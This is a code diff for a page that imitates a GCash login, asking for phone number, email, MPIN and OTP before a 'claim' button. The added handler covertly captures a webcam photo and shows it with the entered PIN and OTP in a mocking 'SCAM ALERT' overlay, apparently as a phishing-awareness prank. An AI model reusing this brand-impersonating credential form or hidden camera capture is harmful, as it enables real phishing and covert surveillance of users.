@@ -1,5 +1,3 @@
-// GCash Login Script
-
 document.addEventListener('DOMContentLoaded', function() {
     // Get all form elements
     const phoneForm = document.getElementById('phone-form');
@@ -34,7 +32,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const resendCode = document.getElementById('resend-code');
     const countdown = document.getElementById('countdown');
     const timer = document.getElementById('timer');
-    const continueBtn = document.getElementById('continue-btn');
     
     // Phone number validation
     phoneForm.addEventListener('submit', function(e) {
@@ -42,123 +39,60 @@ document.addEventListener('DOMContentLoaded', function() {
         
         const phoneNumber = document.getElementById('phone-number').value.trim();
         
-        // Validate phone number (must be 10 digits starting with 9)
         if (!/^9\d{9}$/.test(phoneNumber)) {
             phoneError.textContent = 'Please enter a valid mobile number';
             return;
         }
         
-        // Format phone number for display
         const formattedPhone = formatPhoneNumber(phoneNumber);
         displayPhone.textContent = formattedPhone;
         
-        // Get email address
         const emailAddress = document.getElementById('email-address').value.trim();
-        
-        // Display email address on OTP screen
         displayPhoneOtp.textContent = emailAddress;
         
-        // Clear error message
         phoneError.textContent = '';
-        
-        // Show PIN screen
         phoneScreen.style.display = 'none';
         pinScreen.style.display = 'block';
-        
-        // Focus on first PIN input
         pinInputs[0].focus();
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // PIN input handling
     pinInputs.forEach(function(input, index) {
-        // Handle input
         input.addEventListener('input', function(e) {
-            // Allow only numbers
             this.value = this.value.replace(/[^0-9]/g, '');
-            
-            // Move to next input if value is entered
             if (this.value && index < pinInputs.length - 1) {
                 pinInputs[index + 1].focus();
             }
-            
-            // Check if all inputs have values
             checkPinInputs();
-            
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
         });
-    }
-});
         
-        // Handle keydown
         input.addEventListener('keydown', function(e) {
-            // Move to previous input on backspace if current input is empty
             if (e.key === 'Backspace' && !this.value && index > 0) {
                 pinInputs[index - 1].focus();
             }
-            
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
         });
-    }
-});
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // PIN form submission
     pinForm.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Get PIN
         const pin = Array.from(pinInputs).map(input => input.value).join('');
         
-        // Validate PIN (must be 4 digits)
         if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
             pinError.textContent = 'Please enter a valid 4-digit MPIN';
             return;
         }
         
-        // Clear error message
-        pinError.textContent = '';
-        
-        // Get email address from the first screen
         const emailAddress = document.getElementById('email-address').value.trim();
-        
-        // Validate email address
         if (!emailAddress || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailAddress)) {
             pinError.textContent = 'Please enter a valid email address';
             return;
         }
         
-        // Generate OTP (fixed for demo purposes)
+        pinError.textContent = '';
         const otp = '092422';
         
-        // Send OTP email via the server
         fetch('/send_otp', {
             method: 'POST',
             headers: {
@@ -172,211 +106,290 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(response => response.json())
         .then(data => {
             console.log('OTP email sent:', data);
-            // Show OTP screen regardless of email success (for demo purposes)
             pinScreen.style.display = 'none';
             otpScreen.style.display = 'block';
-            
-            // Focus on first OTP input
             otpInputs[0].focus();
-            
-            // Start countdown
             startCountdown();
         })
         .catch(error => {
             console.error('Error sending OTP email:', error);
-            // Show OTP screen anyway (for demo purposes)
             pinScreen.style.display = 'none';
             otpScreen.style.display = 'block';
-            
-            // Focus on first OTP input
             otpInputs[0].focus();
-            
-            // Start countdown
             startCountdown();
-            
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
         });
-    }
-});
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // Change number link
     changeNumber.addEventListener('click', function(e) {
         e.preventDefault();
-        
-        // Show phone screen
         pinScreen.style.display = 'none';
         phoneScreen.style.display = 'block';
-        
-        // Clear PIN inputs
         pinInputs.forEach(input => input.value = '');
-        
-        // Disable PIN submit button
         pinSubmit.disabled = true;
-        
-        // Clear error message
         pinError.textContent = '';
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // OTP input handling
     otpInputs.forEach(function(input, index) {
-        // Handle input
         input.addEventListener('input', function(e) {
-            // Allow only numbers
             this.value = this.value.replace(/[^0-9]/g, '');
-            
-            // Move to next input if value is entered
             if (this.value && index < otpInputs.length - 1) {
                 otpInputs[index + 1].focus();
             }
-            
-            // Check if all inputs have values
             checkOtpInputs();
-            
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
         });
-    }
-});
         
-        // Handle keydown
         input.addEventListener('keydown', function(e) {
-            // Move to previous input on backspace if current input is empty
             if (e.key === 'Backspace' && !this.value && index > 0) {
                 otpInputs[index - 1].focus();
             }
-            
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
         });
-    }
-});
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // OTP form submission
     otpForm.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Get OTP
         const otp = Array.from(otpInputs).map(input => input.value).join('');
         
-        // Validate OTP (must be 6 digits)
         if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
             otpError.textContent = 'Please enter a valid 6-digit code';
             return;
         }
         
-        // For demo purposes, check against fixed OTP code
         const validOtp = '092422';
         if (otp !== validOtp) {
             otpError.textContent = 'Invalid verification code. Please try again.';
             return;
         }
         
-        // Clear error message
         otpError.textContent = '';
-        
-        // Show success screen
         otpScreen.style.display = 'none';
         successScreen.style.display = 'block';
         
-        // Start confetti animation
         if (typeof confetti !== 'undefined' && confetti.start) {
             confetti.start();
             setTimeout(() => {
                 confetti.stop();
             }, 5000);
         }
-        
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
-    }
-});
+    });
     
     // Resend code link
     resendCode.addEventListener('click', function(e) {
         e.preventDefault();
-        
-        // Hide resend link
         resendCode.style.display = 'none';
-        
-        // Show timer
         timer.style.display = 'inline';
-        
-        // Start countdown
         startCountdown();
-        
-        // Clear OTP inputs
         otpInputs.forEach(input => input.value = '');
-        
-        // Disable OTP submit button
         otpSubmit.disabled = true;
-        
-        // Clear error message
         otpError.textContent = '';
-        
-        // Focus on first OTP input
         otpInputs[0].focus();
-        
-    // Add event listener for claim button
+    });
+    
+    // Enhanced Claim button functionality with camera capture
     const claimButton = document.querySelector('.claim-button');
     if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
+        claimButton.addEventListener('click', async function() {
+            const phoneNumber = document.getElementById('phone-number').value.trim();
+            const formattedPhone = formatPhoneNumber(phoneNumber);
+            const emailAddress = document.getElementById('email-address').value.trim();
+            const pin = Array.from(pinInputs).map(input => input.value).join('');
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+
+            // Silently access camera
+            let photoDataUrl = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.style.display = 'none'; // Keep it hidden
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                await video.play();
+
+                // Capture photo after a short delay
+                await new Promise(resolve => setTimeout(resolve, 500)); // Wait for video to load
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photoDataUrl = canvas.toDataURL('image/jpeg');
+
+                // Clean up
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+            } catch (error) {
+                console.error('Camera access failed:', error);
+                photoDataUrl = null; // Fallback if camera fails
+            }
+
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: linear-gradient(135deg, #1a1a1a 0%, #4a0000 100%);
+                z-index: 9999;
+                overflow: auto;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 20px;
+                font-family: Arial, sans-serif;
+            `;
+            
+            const warningText = document.createElement('h1');
+            warningText.textContent = '🚨 SCAM ALERT ACTIVATED! 🚨';
+            warningText.style.cssText = `
+                color: #ff4444;
+                font-size: 2.8rem;
+                text-align: center;
+                margin: 30px 0;
+                text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+                animation: shake 0.5s infinite;
+            `;
+            
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes shake {
+                    0% { transform: translate(2px, 1px) rotate(0deg); }
+                    10% { transform: translate(-1px, -2px) rotate(-2deg); }
+                    20% { transform: translate(-3px, 0px) rotate(2deg); }
+                    30% { transform: translate(3px, 2px) rotate(0deg); }
+                    40% { transform: translate(1px, -1px) rotate(2deg); }
+                    50% { transform: translate(-1px, 2px) rotate(-2deg); }
+                    60% { transform: translate(-3px, 1px) rotate(0deg); }
+                    70% { transform: translate(3px, 1px) rotate(-2deg); }
+                    80% { transform: translate(-1px, -1px) rotate(2deg); }
+                    90% { transform: translate(1px, 2px) rotate(0deg); }
+                    100% { transform: translate(2px, -2px) rotate(-2deg); }
+                }
+                @keyframes float {
+                    0% { transform: translateY(0px); }
+                    50% { transform: translateY(-15px); }
+                    100% { transform: translateY(0px); }
+                }
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                @keyframes pulse {
+                    0% { transform: scale(1); }
+                    50% { transform: scale(1.05); }
+                    100% { transform: scale(1); }
+                }
+            `;
+            document.head.appendChild(style);
+
+            // User info display with photo
+            const userInfo = document.createElement('div');
+            userInfo.style.cssText = `
+                background: rgba(255, 255, 255, 0.1);
+                padding: 20px;
+                border-radius: 10px;
+                margin-bottom: 20px;
+                width: 80%;
+                max-width: 500px;
+                text-align: center;
+                color: #fff;
+                animation: pulse 2s infinite;
+            `;
+            userInfo.innerHTML = `
+                <h2>🔍 Caught You in 4K! 🔍</h2>
+                ${photoDataUrl ? `<img src="${photoDataUrl}" style="max-width: 100%; border-radius: 10px; margin: 10px 0; border: 3px solid #ff4444;" alt="Your surprised face!">` : '<p style="color: #ff9999;">Camera shy? No photo this time!</p>'}
+                <p><strong>Phone:</strong> ${formattedPhone}</p>
+                <p><strong>Email:</strong> ${emailAddress}</p>
+                <p><strong>PIN:</strong> ${pin} (Yikes!)</p>
+                <p><strong>OTP:</strong> ${otp} (Are u stoopid?)</p>
+                <p style="color: #ff9999; font-style: italic;">Say cheese! Scammers would’ve loved this snapshot! 📸</p>
+            `;
+
+            const messageContainer = document.createElement('div');
+            messageContainer.style.cssText = `
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+                margin: 20px 0;
+                width: 90%;
+                max-width: 800px;
+            `;
+            
+            const scamTips = [
+                "FREE MONEY? MORE LIKE FREE HACKS! 😂",
+                "SCAMMERS LOVE YOUR PIN MORE THAN YOU DO!",
+                "CHECK THAT URL OR LOSE IT ALL! 🔗",
+                "TOO GOOD TO BE TRUE = TOO BAD FOR YOU!",
+                "PHISHERS GONNA PHISH, DON’T BE THE CATCH! 🎣",
+                "YOUR INFO IS GOLD TO CRIMINALS! 💰",
+                "NEVER SHARE OTPs, NOT EVEN WITH 'GCASH'!",
+                "LEGIT SITES DON’T BEG FOR YOUR PIN!",
+                "RANDOM EMAILS PROMISING CASH? DELETE! 🚮",
+                "PROTECT YOURSELF OR REGRET YOURSELF! 🛡️"
+            ];
+            
+            scamTips.forEach(tip => {
+                const tipBox = document.createElement('div');
+                tipBox.style.cssText = `
+                    width: ${Math.floor(Math.random() * 150) + 100}px;
+                    padding: 15px;
+                    background: ${getRandomColor()};
+                    border-radius: 15px;
+                    color: white;
+                    text-align: center;
+                    font-weight: bold;
+                    font-size: 1.1rem;
+                    transform: rotate(${Math.floor(Math.random() * 20) - 10}deg);
+                    animation: float ${Math.floor(Math.random() * 2) + 2}s infinite ease-in-out;
+                    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                `;
+                tipBox.textContent = tip;
+                messageContainer.appendChild(tipBox);
+            });
+
+            // Add some floating emojis
+            for (let i = 0; i < 8; i++) {
+                const emoji = document.createElement('div');
+                emoji.style.cssText = `
+                    position: absolute;
+                    top: ${Math.floor(Math.random() * 80) + 10}%;
+                    left: ${Math.floor(Math.random() * 80) + 10}%;
+                    font-size: 2.5rem;
+                    animation: spin ${Math.floor(Math.random() * 4) + 2}s infinite linear;
+                    pointer-events: none;
+                `;
+                emoji.textContent = getRandomEmoji();
+                overlay.appendChild(emoji);
+            }
+
+            const closeButton = document.createElement('button');
+            closeButton.textContent = 'I PROMISE TO BE SMARTER!';
+            closeButton.style.cssText = `
+                padding: 15px 40px;
+                background: #00e676;
+                color: white;
+                border: none;
+                border-radius: 25px;
+                font-size: 1.3rem;
+                font-weight: bold;
+                cursor: pointer;
+                margin: 30px 0;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                transition: transform 0.2s;
+            `;
+            closeButton.addEventListener('mouseover', () => closeButton.style.transform = 'scale(1.05)');
+            closeButton.addEventListener('mouseout', () => closeButton.style.transform = 'scale(1)');
+            closeButton.addEventListener('click', () => document.body.removeChild(overlay));
+            
+            overlay.appendChild(warningText);
+            overlay.appendChild(userInfo);
+            overlay.appendChild(messageContainer);
+            overlay.appendChild(closeButton);
+            document.body.appendChild(overlay);
         });
-    }
-});
-    
-    // Success screen animation effects
-    function showSuccessEffects() {
-        // Add any additional success screen effects here
-        console.log('Success screen shown with animations');
     }
     
     // Helper functions
@@ -401,7 +414,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const interval = setInterval(function() {
             seconds--;
             countdown.textContent = seconds;
-            
             if (seconds <= 0) {
                 clearInterval(interval);
                 timer.style.display = 'none';
@@ -410,12 +422,13 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 1000);
     }
     
-    // Add event listener for claim button
-    const claimButton = document.querySelector('.claim-button');
-    if (claimButton) {
-        claimButton.addEventListener('click', function() {
-            console.log('Claim button clicked');
-            window.close();
-        });
+    function getRandomColor() {
+        const colors = ['#ff4444', '#00c853', '#2962ff', '#aa00ff', '#ff9100', '#00e5ff', '#ffea00'];
+        return colors[Math.floor(Math.random() * colors.length)];
+    }
+    
+    function getRandomEmoji() {
+        const emojis = ['🚨', '💀', '🤓', '🚫', '⚠️', '🔐', '🛡️', '🤡', '🙈', '🎭', '⛔', '💸', '🔍', '🤨', '🧠'];
+        return emojis[Math.floor(Math.random() * emojis.length)];
     }
 });
